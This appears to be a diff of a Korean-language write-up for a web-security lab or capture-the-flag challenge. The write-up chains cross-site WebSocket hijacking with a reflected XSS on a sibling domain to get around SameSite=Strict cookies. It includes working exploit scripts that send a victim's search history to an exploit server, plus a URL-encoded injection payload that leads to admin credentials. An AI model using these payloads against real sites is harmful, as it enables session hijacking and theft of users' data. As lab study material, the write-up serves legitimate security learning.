@@ -9,41 +9,67 @@ To adopt kitties ₍^. .^₎⟆
 - 전체 Search History를 반환하는 기능 구현
 <br>
 
-## 문제 풀이 시나리오
-### 1. 검색 기능 분석
-- 무언가를 검색하면 검색 기록도 반환됨
-- 검색 기록은 유저 아이디에 따라 반환
-- 개발자 툴을 통해 살펴보면 웹 소켓 핸드셰이크를 찾을 수 있음
-- 요청에 예측 불가능한 토큰이 없기 때문에 CSWSH 취약점의 가능성 확인 가능
-- 페이지 새로고침 시 클라이언트가 READY 메시지를 서버에 보내고 서버는 검색 기록으로 응답
-### 2. CSWSH 취약점 확인
-- search.js에서 코드 확인하고
-- 공격 스크립트 작성해 익스플로잇 서버 통해 보내기
-- 스크립트 실행 시 새 웹소켓 연결이 생성되고 검색 기록이 유출됨
-    <script>
-        let newWebSocket = new WebSocket("ws://localhost:5000/search");
-        newWebSocket.onopen = function () {
-            newWebSocket.send("READY");
-        };
+## 1. 검색 기능 분석
 
-        newWebSocket.onmessage = function (event) {
-        var message = event.data;
-        fetch(
-            "{익스플로잇서버주소}message?=" + btoa(message) //base64인코딩
-        );
-        };
-    </script>
-- 하지만 세션 쿠키가 포함되지 않기 때문에 새 세션의 검색 기록만 얻을 수 있음
-- 확인해보면 서버가 SameSite=Strict이기 때문에 크로스사이트 요청에 쿠키를 보내지 않음을 확인할 수 있음
-### 3. sibling domain에서 추가 취약점 발견
-- Access-Control-Allow-Origin 을 통해 sibling domain 있는 것 확인
+- 검색창에 무언가를 검색하면 검색 기록도 반환됨
+- 검색 기록은 세션에 따라 반환됨
+- 개발자 툴을 통해 살펴보면 웹 소켓 핸드셰이크를 찾을 수 있음
+- “순수 WebSocket 프레임”이 아니라 Socket.IO 프레이밍을 사용하는 것 파악
+- 요청에 예측 불가능한 토큰이 없기 때문에 CSWSH 취약점의 가능성
+- 페이지 새로고침 시 클라이언트가 READY 메시지를 서버에 보내고 서버는 검색 기록으로 응답함
+(단순 `new WebSocket(...).send("READY")` 로는 안 됨. Socket.IO 클라이언트를 써서 `socket.emit("READY", …)` 로 보내야 함)
+
+## 2. CSWSH 취약점 확인
+
+- search.js에서 코드 확인하고 공격 스크립트 작성해 익스플로잇 서버 통해 보내기
+    
+    ### 2-1. 공격 스크립트 작성
+    
+    - 아래와 같이 익스플로잇 코드를 작성하여 익스플로잇 서버에 주입
+    - 웹소켓 주소 알아내기 (F12 -> Network -> Socket: request url)
+        
+        ```html
+        <script src="http://127.0.0.1:5000/static/js/socket.io.min.js"></script>
+        <script>
+        // exploit.js (참가자가 작성)
+        const socket = io("http://web:5000"); // Socket.IO 연결
+        socket.on('connect', () => socket.emit("READY", {}));
+        socket.on('search_history', (data) => {
+          fetch(`http://exploit:8000/collect?job=${jobId}&msg=${btoa(data.search_term)}`);
+        });
+        </script>
+        ```
+        
+    - /logs 확인해보면 검색 기록이 유출되지만 세션 쿠키가 포함되지 않기 때문에 새 세션의 검색 기록만 얻을 수 있음
+    - 서버가 SameSite=Strict이기 때문에 크로스사이트 요청에 쿠키를 보내지 않음을 확인할 수 있음
+
+## 3. sibling domain에서 추가 취약점 발견
+
+- 리소스 응답에 Access-Control-Allow-Origin 헤더가 sibling domain을 허용하는 것 확인
 - 해당 페이지에 접속해보면 로그인 폼을 확인할 수 있음
-- username 파라미터가 응답에 반영되는 reflected XSS 취약점이 있는 것을 확인할 수 있음
-- POST 요청을 GET으로 변환해도 XSS가 동작하여 URL로 직접 공격 코드 삽입 가능
-- sibling 도메인이 같은 사이트로 간주되어 SameSite 쿠키 제한 우회에 이용 가능
-### 5. sibling domain을 통해 SameSite restriction 우회
-- 기존 CSWSH 스크립트를 URL 인코딩하여 username 파라미터에 삽입
-- 익스플로잇 서버에 그 url로 리다이렉트하는 스크립트 생성
-    => 전체 검색 기록이 유출됨
-### 6. 전송된 메시지 분석해서 admin 정보 획득
-- 로그인 하면 성공
+- reflected XSS 취약점이 있는 것을 확인할 수 있음
+    - `<script>alert(1)</script>` 보내서 확인 가능
+- POST 요청을 GET으로 변환해도 XSS가 동작하는지 확인하고(동작함)
+    - burp의 change request method로 가능
+- URL로 직접 공격 코드 삽입
+- sibling 도메인이 같은 사이트로 간주되어 SameSite 쿠키 제한 우회에 이용 가능함
+
+## 4. SameSite restrictions 우회
+
+- 이전 익스플로잇 스크립트를 URL 인코딩해서 sibling domain의 로그인 페이지의 username 파라미터에 삽입하는 코드 작성
+    
+    ```html
+    <script>
+    //sibling domain endpoint /login 뒤에 인코딩한 것 전체 복붙
+    document.location="https://cms-0a53007a03d749349b3171130036002b.web-security-academy.net/login?username=%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%35%33%30%30%37%61%30%33%64%37%34%39%33%34%39%62%33%31%37%31%31%33%30%30%33%36%30%30%32%62%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%09%20%20%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%39%39%30%30%38%64%30%33%37%30%34%39%36%30%39%62%35%63%37%30%63%35%30%31%36%35%30%30%64%62%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%20%20%20%20%7d%3b&password=z";
+    </script>
+    ```
+    
+- 익스플로잇 서버에서 전송
+    
+    => 전체 검색 기록이 유출됨. 유출된 기록에 admin 로그인 정보 포함
+    
+
+### 5. 로그인
+
+- admin 정보를 통해 로그인하면 flag 획득
